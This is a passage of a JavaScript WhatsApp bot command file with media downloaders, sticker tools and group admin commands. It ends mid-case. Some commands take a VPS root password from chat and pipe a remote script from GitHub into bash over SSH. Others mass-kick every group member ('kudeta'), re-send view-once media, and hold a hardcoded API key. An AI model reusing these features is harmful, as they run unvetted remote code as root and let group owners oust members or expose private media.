await Sky.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "mediafire": {
if (!text) return m.reply(example("linknya"))
if (!text.includes('mediafire.com')) return m.reply("Link tautan tidak valid")
await Sky.sendMessage(m.chat, {react: {text: '⏱', key: m.key}})
await mediafire(text).then(async (res) => {
if (!res.link) return m.reply("Error! Result Not Found")
await Sky.sendMessage(m.chat, {document: {url: res.link}, fileName: res.judul, mimetype: "application/"+res.mime.toLowerCase()}, {quoted: m})
}).catch((e) => m.reply("Error! Result Not Found"))
await sleep(1000)
await Sky.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "tiktokmp3": case "ttmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await Sky.sendMessage(m.chat, {react: {text: '⏱', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await Sky.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await Sky.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

//================================================================================

case 'mods': case 'modapk': case 'apkmod': {
  const axios = require('axios')
  const cheerio = require('cheerio')

  async function mods(apk) {
    const url = `https://m.happymod.com/search.html?q=${apk}`

    const response = await axios.get(url)
    const html = response.data
    const $ = cheerio.load(html)

    const apps = []

    $('.app-info-list .s-app-block').each((index, element) => {
      const app = {
        creator: 'zaenishi',
        status: 200,
        title: $(element).find('.info-wrap .nowrap a').text().trim(),
        image: $(element).find('.img img').attr('data-src'),
        downloadUrl: `https://m.happymod.com${$(element).find('.down a').attr('href')}`
      }
      apps.push(app)
      if (apps.length >= 5) return false
    })

    return apps
  }

  if (text) {
    const response = await mods(text)
    let result = ''

    response.forEach((app, index) => {
      result += `*\`${index + 1}. ${app.title}:\`*\n`
      result += `- Download ${app.downloadUrl}\n\n`
    })

    Reply(result)
  } else {
    m.reply(example(`Capcut`))
  }
}
break

//================================================================================

case "instagram": case "igdl": case "ig": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await Sky.sendMessage(m.chat, {react: {text: '⏱', key: m.key}})
await fetchJson(`https://btch.us.kg/download/igdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await Sky.sendMessage(m.chat, {video: {url: res.result[0].url}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
}).catch((e) => m.reply("Error! Result Not Found"))
await Sky.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "gitclone": {
if (!text) return m.reply(example("https://github.com/Skyzodev/Simplebot"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    Sky.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! Repositori Tidak Ditemukan`)
}}
break

//================================================================================

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await Sky.sendMessage(m.chat, {react: {text: '⏱', key: m.key}})
await tiktokDl(q).then(async (result) => {
if (!result.status) return m.reply("Error!")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: Sky.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await Sky.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await Sky.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await Sky.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await Sky.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

//================================================================================

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break


case "shortlink-dl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await Sky.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//================================================================================

case "idgc": case "cekidgc": {
if (!m.isGroup) return Akses(mess.group)
m.reply(m.chat)
}
break

//================================================================================

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = `\n *乂 List all group chat*\n`
let a = await Sky.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//================================================================================

case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await Sky.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break

//================================================================================

case "pin": case "pinterest": {
if (!text) return m.reply(example("anime dark"))
await Sky.sendMessage(m.chat, {react: {text: '⏱', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: Sky.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await Sky.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await Sky.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ai": case "gpt": case "openai": {
let talk = text ? text : "hai"
await fetchJson("https://btch.us.kg/prompt/gpt?prompt=Sekarang%20kamu%20adalah%20Skyzo-AI&text=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

//================================================================================

case 'brat': {
const { createCanvas, registerFont } = require('canvas');
const Jimp = require('jimp');
await loading ()
async function BratGenerator(teks) {
  let width = 512;
  let height = 512;
  let margin = 20;
  let wordSpacing = 50; 
  let canvas = createCanvas(width, height);
  let ctx = canvas.getContext('2d');
  ctx.fillStyle = 'white';
  ctx.fillRect(0, 0, width, height);
  let fontSize = 280;
  let lineHeightMultiplier = 1.3;
  ctx.textAlign = 'left';
  ctx.textBaseline = 'top';
  ctx.fillStyle = 'black';
registerFont('./library/arialnarrow.ttf', { family: 'Narrow' });
  let words = teks.split(' ');
  let lines = [];
  let rebuildLines = () => {
    lines = [];
    let currentLine = '';
    for (let word of words) {
      let testLine = currentLine ? `${currentLine} ${word}` : word;
      let lineWidth =
        ctx.measureText(testLine).width + (currentLine.split(' ').length - 1) * wordSpacing;
      if (lineWidth < width - 2 * margin) {
        currentLine = testLine;
      } else {
        lines.push(currentLine);
        currentLine = word;
      }
    }
    if (currentLine) {
      lines.push(currentLine);
    }
  };
  ctx.font = `${fontSize}px Narrow`;
  rebuildLines();
  while (lines.length * fontSize * lineHeightMultiplier > height - 2 * margin) {
    fontSize -= 2;
    ctx.font = `${fontSize}px Narrow`;
    rebuildLines();
  }
    let lineHeight = fontSize * lineHeightMultiplier;
  let y = margin;
  for (let line of lines) {
    let wordsInLine = line.split(' ');
    let x = margin;
    for (let word of wordsInLine) {
      ctx.fillText(word, x, y);
      x += ctx.measureText(word).width + wordSpacing;
    }
    y += lineHeight;
  }
  let buffer = canvas.toBuffer('image/png');
  let image = await Jimp.read(buffer);
  image.blur(3);
  let blurredBuffer = await image.getBufferAsync(Jimp.MIME_PNG);
return Sky.sendAsSticker(m.chat, blurredBuffer, m, { packname: "Kats Botz", author: "Andika Botz!" })
}
if (!text) return m.reply(example(`Andika Ganteng`));
return BratGenerator(text)
}
break

//================================================================================

case "qc": {
if (!text) return m.reply(example('teksnya'))
await Sky.sendMessage(m.chat, {react: {text: '⏱', key: m.key}})
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
var ppuser
try {
ppuser = await Sky.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#000000",
  "width": 812,
  "height": 968,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = "./library/database/sampah/"+m.sender+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await Sky.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
await Sky.sendMessage(m.chat, {react: {text: '', key: m.key}})
await fs.unlinkSync(`${tempnya}`)
})
})
}
break

//================================================================================

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
await Sky.sendMessage(m.chat, {react: {text: '⏱', key: m.key}})
var image = await Sky.downloadAndSaveMediaMessage(qmsg)
await Sky.sendAsSticker(m.chat, image, m, {packname: global.packname})
await Sky.sendMessage(m.chat, {react: {text: '', key: m.key}})
await fs.unlinkSync(image)
}
break

//================================================================================

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await Sky.downloadAndSaveMediaMessage(qmsg)
await Sky.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

//================================================================================

case "rvo": case "readviewonce": {
if (!m.quoted) return m.reply(example("dengan reply pesannya"))
let msg = m.quoted.message
    let type = Object.keys(msg)[0]
if (!msg[type].viewOnce) return m.reply("Pesan itu bukan viewonce!")
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : type == 'videoMessage' ? 'video' : 'audio')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return Sky.sendMessage(m.chat, {video: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/image/.test(type)) {
        return Sky.sendMessage(m.chat, {image: buffer, caption: msg[type].caption || ""}, {quoted: m})
    } else if (/audio/.test(type)) {
        return Sky.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break

//================================================================================

case "tourl": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
await loading ()
let media = await Sky.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'katsbotz.jpg');
let teks = directLink.toString()
let redi = `
*Your Link Is Ready :*
${teks}
`
await Sky.sendMessage(m.chat, {text: redi}, {quoted: m})
await fs.unlinkSync(media)
}
break

//================================================================================

case "tourl2": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
await loading ()
let media = await Sky.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('postimages.org');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'katsbotz.jpg');
let teks = directLink.toString()
let redi = `
*Your Link Is Ready :*
${teks}
`
await Sky.sendMessage(m.chat, {text: redi}, {quoted: m})
await fs.unlinkSync(media)
}
break

//================================================================================

case "tr": case "translate": case "translet": {
await loading ()
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}
}
break

//================================================================================

case "tohd": case "hd": case "remini": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
await Sky.sendMessage(m.chat, {react: {text: '⏱', key: m.key}})
let foto = await Sky.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await Sky.sendMessage(m.chat, {image: result}, {quoted: m})
await Sky.sendMessage(m.chat, {react: {text: '', key: m.key}})
await fs.unlinkSync(foto)
}
break

//================================================================================

case "add": {
if (!m.isGroup) return Akses(mess.group)
if (!isCreator && !m.isAdmin) return Akses(mess.admin)
if (!m.isBotAdmin) return Akses(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Sky.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await Sky.groupParticipantsUpdate(m.chat, [input], 'add')
await m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(example("62838###"))
}
}
break

//================================================================================

case "kick": case "kik": {
if (!m.isGroup) return Akses(mess.group)
if (!isCreator && !m.isAdmin) return Akses(mess.admin)
if (!m.isBotAdmin) return Akses(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await Sky.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await Sky.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//================================================================================

case "leave": {
if (!isCreator) return Akses(mess.owner)
if (!m.isGroup) return Akses(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await Sky.groupLeave(m.chat)
}
break

//================================================================================

case "resetlinkgc": {
if (!m.isAdmin) return Akses(mess.admin)
if (!m.isGroup) return Akses(mess.group)
if (!m.isBotAdmin) return Akses(mess.botAdmin)
await Sky.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//================================================================================

case "tagall": {
if (!m.isGroup) return Akses(mess.group)
if (!isCreator && !m.isAdmin) return Akses(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await Sky.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "linkgc": {
if (!m.isGroup) return Akses(mess.group)
if (!m.isAdmin && !isCreator) return Akses(mess.admin)
if (!m.isBotAdmin) return Akses(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await Sky.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await Sky.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//================================================================================

case "ht": case "hidetag": case "h": {
if (!m.isGroup) return Akses(mess.group)
if (!isCreator && !m.isAdmin) return Akses(mess.admin)
if (!text) return m.reply(example("pesannya"))
let member = m.metadata.participants.map(v => v.id)
await Sky.sendMessage(m.chat, {text: text, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "joingc": case "join": {
if (!isCreator) return Akses(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await Sky.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//================================================================================

case "get": case "g": {
if (!isCreator) return Akses(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//================================================================================

case "joinch": case "joinchannel": {
if (!isCreator) return Akses(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await Sky.newsletterMetadata("invite", result)
await Sky.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//================================================================================

case "on0": case "off0": {
if (!m.isGroup) return Akses(mess.group)
if (!isOwner && !m.isAdmin) return Akses(mess.admin)
let gc = Object.keys(db.groups[m.chat])
if (!text || isNaN(text)) {
let teks = "\n*乂 List opstion group settings*\n\n"
await gc.forEach((i, e) => {
teks += `* ${e + 1}. ${capital(i)} : ${db.groups[m.chat][i] ? "_aktif_" : "_tidak aktif_"}\n`
})
teks += `\n Contoh penggunaan *.${command}* 1\n\n*_Kamu Tidak Bisa Nonaktifkan › Mute ‹ Jika Kamu Aktifkan_*\n`
return m.reply(teks)
}
const num = Number(text)
let total = gc.length
if (num > total) return
const event = gc[num - 1]
global.db.groups[m.chat][event] = command == "on0" ? true : false
return m.reply(`Berhasil *${command == "on0" ? "mengaktifkan" : "mematikan"} ${event}* di grup ini`)
}
break

//================================================================================

case "on": case "off": {
if (!m.isGroup) return Akses(mess.group)
if (!isOwner && !m.isAdmin) return Akses(mess.admin)
let gc = Object.keys(db.groups[m.chat])
let teks = "*\`List opstion group settings\`*\n\n"
await gc.forEach((i, e) => {
teks += `* ${e + 1}. ${capital(i)} : ${db.groups[m.chat][i] ? "_aktif_" : "_tidak aktif_"}\n`
})
teks += `\n*Select menu di bawah untuk mengaktifkan atau mematikan*\n_Kamu Tidak Bisa Nonaktifkan ›Mute‹ Jika Kamu Aktifkan_`
	let msg = generateWAMessageFromContent(m.chat, {
	viewOnceMessage: {
	message: {
	"messageContextInfo": {
	"deviceListMetadata": {},
	"deviceListMetadataVersion": 2
	},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teks
}),
  footer: proto.Message.InteractiveMessage.Footer.create({
  text: namaOwner }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
  {
	"name": "single_select",
	"buttonParamsJson": `{
	"title": "Aktifkan!",
	"sections": [{
	"title": "Select the menu you need at ${botname}",
	"rows": [{
	"title": "✨ Donasi",
	"description": "sᴜᴘᴘᴏʀᴛ ᴋᴀᴍɪ ᴅᴇɴɢᴀɴ ᴅᴏɴᴀsɪ",
	"id": ".donasi"
	},
	{
    "title": "On Antilink1",
    "description": "ᴋɪᴄᴋ ᴍᴇᴍʙᴇʀ ʏᴀɴɢ ᴍᴇɴɢɪʀɪᴍ ʟɪɴᴋ",
    "id": ".on0 1"
    },
    {
	"title": "On Antilink2",
	"description": "ʜᴀᴘᴜs ᴘᴇsᴀɴ ʏᴀɴɢ ʙᴇʀɪsɪ ʟɪɴᴋ ɢʀᴜʙ",
	"id": ".on0 2"
	},
	{
	"title": "On Welcome",
	"description": "ᴍᴇɴʏᴀᴍʙᴜᴛ ᴍᴇᴍʙᴇʀ ʙᴀʀᴜ",
	"id": ".on0 3"
	},
	{
	"title": "On Mute",
	"description": "ᴍᴇɴᴏɴᴀᴋᴛɪғᴋᴀɴ ʙᴏᴛ ᴅɪ ɢʀᴜʙ sᴇʟᴀᴍᴀɴʏᴀ",
	"id": ".on0 4"
	},
	{
	"title": "On Simi",
	"description": "ᴏᴡɴᴇʀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴᴊᴇʟᴀsᴋᴀɴ",
	"id": ".on0 5"
	},
	{
	"title": "On Blacklist Jpm",
	"description": "ᴛɪᴅᴀᴋ ᴍᴇɴᴅᴀᴘᴀᴛ ᴘᴇsᴀɴ ʙʀᴏᴀᴅᴄᴀsᴛ ᴅᴀʀɪ ʙᴏᴛ ɪɴɪ",
	"id": ".on0 6"
}]
}]
}`
},
  {
	"name": "single_select",
	"buttonParamsJson": `{
	"title": "NonAktifkan",
	"sections": [{
	"title": "Select the menu you need at ${botname}",
	"rows": [{
	"title": "✨ Donasi",
	"description": "sᴜᴘᴘᴏʀᴛ ᴋᴀᴍɪ ᴅᴇɴɢᴀɴ ᴅᴏɴᴀsɪ",
	"id": ".donasi"
	},
	{
    "title": "Off Antilink1",
    "description": "ᴋɪᴄᴋ ᴍᴇᴍʙᴇʀ ʏᴀɴɢ ᴍᴇɴɢɪʀɪᴍ ʟɪɴᴋ",
    "id": ".off0 1"
    },
    {
	"title": "Off Antilink2",
	"description": "ʜᴀᴘᴜs ᴘᴇsᴀɴ ʏᴀɴɢ ʙᴇʀɪsɪ ʟɪɴᴋ ɢʀᴜʙ",
	"id": ".off0 2"
	},
	{
	"title": "Off Welcome",
	"description": "ᴍᴇɴʏᴀᴍʙᴜᴛ ᴍᴇᴍʙᴇʀ ʙᴀʀᴜ",
	"id": ".off0 3"
	},
	{
	"title": "Off Mute",
	"description": "ᴍᴇɴᴏɴᴀᴋᴛɪғᴋᴀɴ ʙᴏᴛ ᴅɪ ɢʀᴜʙ sᴇʟᴀᴍᴀɴʏᴀ",
	"id": ".off0 4"
	},
	{
	"title": "Off Simi",
	"description": "ᴏᴡɴᴇʀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴᴊᴇʟᴀsᴋᴀɴ",
	"id": ".off0 5"
	},
	{
	"title": "Off Blacklist Jpm",
	"description": "ᴛɪᴅᴀᴋ ᴍᴇɴᴅᴀᴘᴀᴛ ᴘᴇsᴀɴ ʙʀᴏᴀᴅᴄᴀsᴛ ᴅᴀʀɪ ʙᴏᴛ ɪɴɪ",
	"id": ".off0 6"
}]
}]
}`
},
],
}),
contextInfo: {
mentionedJid: [m.sender,global.owner+"@s.whatsapp.net"],
forwardingScore: 1,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: global.idSaluran,
serverMessageId: null,
newsletterName: global.namaSaluran,
},
}
})
}
}
}, { quoted: qlocJpm })
await Sky.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
}
break

//================================================================================

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return Akses(mess.group)
if (!m.isBotAdmin) return Akses(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Akses(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await Sky.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await Sky.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//================================================================================

case "kudetagc": case "kudeta": {
if (!isCreator) return Akses(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup By Skyzo Starting 🔥")
for (let i of memberFilter) {
await Sky.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//================================================================================

case "demote":
case "promote": {
if (!m.isGroup) return Akses(mess.group)
if (!m.isBotAdmin) return Akses(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Akses(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await Sky.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await Sky.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//================================================================================

case "uninstalltema": {
if (!isCreator) return Akses(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

//================================================================================

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return Akses(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Akses(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
